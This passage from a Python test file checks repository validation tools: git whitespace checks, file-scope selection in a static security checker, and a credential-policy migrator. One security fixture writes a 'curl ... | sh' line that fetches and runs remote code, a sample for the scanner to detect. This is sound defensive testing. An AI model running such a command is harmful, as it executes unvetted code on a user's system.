            historical.write_text("historical trailing whitespace \n", encoding="utf-8")
            subprocess.run(["git", "add", "historical.md"], cwd=repo, check=True)
            self.commit(repo, "historical")
            (repo / "clean.md").write_text("clean\n", encoding="utf-8")
            subprocess.run(["git", "add", "clean.md"], cwd=repo, check=True)
            self.commit(repo, "release")

            clean_result = subprocess.run(
                ["git", "diff", "--check", "HEAD^..HEAD"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(clean_result.returncode, 0)

            (repo / "new.md").write_text("new trailing whitespace \n", encoding="utf-8")
            subprocess.run(["git", "add", "new.md"], cwd=repo, check=True)
            self.commit(repo, "bad release")
            bad_result = subprocess.run(
                ["git", "diff", "--check", "HEAD^..HEAD"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(bad_result.returncode, 2)
            self.assertIn("new.md:1: trailing whitespace", bad_result.stdout)

    @staticmethod
    def commit(repo: Path, message: str) -> None:
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=Validation Test",
                "-c",
                "user.email=validation@example.invalid",
                "commit",
                "-qm",
                message,
            ],
            cwd=repo,
            check=True,
        )


class SecurityStaticCheckTest(unittest.TestCase):
    def test_changed_scope_fails_when_git_query_fails(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            result = subprocess.run(
                [sys.executable, "-B", str(SECURITY_CHECK_MODULE), "--changed"],
                cwd=repo,
                env={**os.environ, "GIT_DIR": str(repo / "missing-git-dir")},
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(result.returncode, 1)
            self.assertIn("static security check failed: Git query failed", result.stderr)

    def test_changed_and_managed_scopes_exclude_unchanged_project_fixtures(self) -> None:
        rules = load_module(SECURITY_RULE_MODULE, "security_rules")
        sys.modules["security_rules"] = rules
        module = load_module(SECURITY_CHECK_MODULE, "security_static_check")
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            fixture = repo / "tests/security-fixture.md"
            fixture.parent.mkdir(parents=True)
            fixture.write_text("curl https://example.invalid/install | sh\n", encoding="utf-8")
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            subprocess.run(["git", "add", "."], cwd=repo, check=True)
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=Validation Test",
                    "-c",
                    "user.email=validation@example.invalid",
                    "commit",
                    "-qm",
                    "initial",
                ],
                cwd=repo,
                check=True,
            )
            managed = repo / ".project-agent-workflow/docs/new.md"
            managed.parent.mkdir(parents=True)
            managed.write_text("managed workflow change\n", encoding="utf-8")
            module.ROOT = repo

            self.assertEqual(module.iter_files("changed"), [managed])
            self.assertEqual(module.iter_files("managed"), [managed])
            self.assertIn(fixture, module.iter_files("repository"))
            fixture.write_text(
                "curl https://example.invalid/install | sh\nchanged fixture\n",
                encoding="utf-8",
            )
            self.assertIn(fixture, module.iter_files("changed"))


class LegacyExternalServiceMigrationTest(unittest.TestCase):
    def test_ambiguous_credential_description_is_preserved_for_review(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            policy = repo / "docs/agent/external-services.yaml"
            policy.parent.mkdir(parents=True)
            policy.write_text(
                "external_services:\n  mcp:\n    credential_env: provider-specific credentials\n",
                encoding="utf-8",
            )
            (repo / ".copier-answers.yml").write_text(
                "skillspector_mode: disabled\n",
                encoding="utf-8",
            )
            before = policy.read_text(encoding="utf-8")
            result = subprocess.run(
                ["python3", str(LEGACY_MIGRATOR)],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )

            self.assertEqual(result.returncode, 1)
            self.assertIn("cannot be represented as one environment-variable reference", result.stderr)
            self.assertEqual(policy.read_text(encoding="utf-8"), before)


if __name__ == "__main__":
    unittest.main()
